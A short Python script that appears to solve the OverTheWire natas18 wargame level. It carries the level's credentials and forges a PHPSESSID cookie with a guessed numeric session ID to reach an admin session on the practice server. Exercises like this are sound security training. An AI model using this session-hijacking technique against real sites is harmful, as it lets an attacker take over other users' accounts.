import requests

url = 'http://natas18.natas.labs.overthewire.org/'
username = 'natas18'
passw = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
data = { 'username':'admin',
		'password':'nice'
		}

i = 119
cookies = {'PHPSESSID' : '%d' %i}
r = requests.post(url, data=data, auth=(username,passw), cookies=cookies)

content = r.text

if('You are an admin.' in content ):
	print i
	print content